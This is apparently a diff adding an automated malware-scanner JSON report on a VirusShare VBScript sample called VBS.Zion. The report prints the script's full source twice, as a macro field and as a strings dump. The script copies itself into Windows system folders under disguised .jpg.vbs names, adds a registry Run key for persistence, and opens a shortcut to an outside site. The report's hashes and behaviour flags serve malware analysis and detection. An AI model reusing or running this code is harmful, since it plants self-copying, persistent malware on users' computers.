@@ -1,0 +1,68 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WINDOWS": "May enumerate application windows",
+            "WScript.Shell": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "' VBS.Zion\n' by Razorblade\n\nOn Error Resume Next\n\nset fs = CreateObject(\"Scripting.FileSystemObject\")\nset co = CreateObject(\"WScript.Shell\")\nset c = fs.GetFile(WScript.ScriptFullName)\n\nc.Copy(\"C:\\WINDOWS\\zion32.jpg.vbs\")\nc.Copy(\"C:\\WINDOWS\\system\\zion.vbs\")\nc.Copy(\"C:\\WINDOWS\\system32\\zion.vbs\")\nc.Copy(\"C:\\Pro~1\\zion.vbs\")\n\nset zion = fs.CreateTextFile(\"C:\\zion.txt\")\nzion.WriteLine \"VBS.Zion\"\nzion.WriteLine \"by Razorblade\"\nzion.WriteLine \"=============\"\nzion.WriteLine \"Member Of The Legion Of Death\"\nzion.close\n\nOn Error Resume Next\nco.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ZioN\",\"C:\\WINDOWS\\zion.jpg.vbs\",\"REG_SZ\"\n\nOn Error Resume Next\nmsgbox \"THe ZioN\",\"16\",\"By RaZoRBLaDe\"\nSet oUrlLink = co.CreateShortcut(\"VBS.Zion.URL\")\noUrlLink.TargetPath = \"http://www.razor-hacks.de.ms\"\noUrlLink.Save\nws.Run (\"VBS.Zion.URL\")\n\n' Code End\n' Written by Razorblade\n' 2004"
+    },
+    "filename": "VirusShare_122614afc09097c0cf01f9b4e7c48655",
+    "filesize": 933,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "122614afc09097c0cf01f9b4e7c48655",
+        "sha1": "4d8ab83364223d64f472b3ee4eabe43702edc06f",
+        "sha256": "8dced437a75bfda8bdc81e7c2a33253ba7f0cd37329904efe8993e0aee52ce78"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "' VBS.Zion",
+            "' by Razorblade",
+            "On Error Resume Next",
+            "set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "set co = CreateObject(\"WScript.Shell\")",
+            "set c = fs.GetFile(WScript.ScriptFullName)",
+            "c.Copy(\"C:\\WINDOWS\\zion32.jpg.vbs\")",
+            "c.Copy(\"C:\\WINDOWS\\system\\zion.vbs\")",
+            "c.Copy(\"C:\\WINDOWS\\system32\\zion.vbs\")",
+            "c.Copy(\"C:\\Pro~1\\zion.vbs\")",
+            "set zion = fs.CreateTextFile(\"C:\\zion.txt\")",
+            "zion.WriteLine \"VBS.Zion\"",
+            "zion.WriteLine \"by Razorblade\"",
+            "zion.WriteLine \"=============\"",
+            "zion.WriteLine \"Member Of The Legion Of Death\"",
+            "zion.close",
+            "On Error Resume Next",
+            "co.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ZioN\",\"C:\\WINDOWS\\zion.jpg.vbs\",\"REG_SZ\"",
+            "On Error Resume Next",
+            "msgbox \"THe ZioN\",\"16\",\"By RaZoRBLaDe\"",
+            "Set oUrlLink = co.CreateShortcut(\"VBS.Zion.URL\")",
+            "oUrlLink.TargetPath = \"http://www.razor-hacks.de.ms\"",
+            "oUrlLink.Save",
+            "ws.Run (\"VBS.Zion.URL\")",
+            "' Code End",
+            "' Written by Razorblade",
+            "' 2004"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.razor-hacks.de.ms"
+        ]
+    },
+    "time": "0:00:00.294829",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
